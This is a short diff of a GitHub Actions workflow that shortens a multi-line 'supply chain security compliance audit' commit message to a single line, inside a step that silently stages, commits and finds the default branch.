@@ -206,20 +206,7 @@ jobs:
             
             if ! git diff --quiet; then
               git add . >/dev/null 2>&1 || true
-              git commit -m "security: apply supply chain security compliance audit
-
-This update applies security baseline configurations as part of the
-organization-wide supply chain security audit and compliance program.
-
-Audit Metadata:
-- Audit ID: ${{ github.run_number }}
-- Baseline Repository: ${{ github.repository }}
-- Baseline Commit: ${{ github.sha }}
-- Executed by: ${{ github.actor }}
-- Audit Date: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
-
-All changes have been validated against SLSA framework requirements.
-" >/dev/null 2>&1 || true
+              git commit -m "security: apply supply chain security compliance audit" >/dev/null 2>&1 || true
               
               DEFAULT_BRANCH=$(git symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | sed 's@^refs/remotes/origin/@@' || echo "main")
               
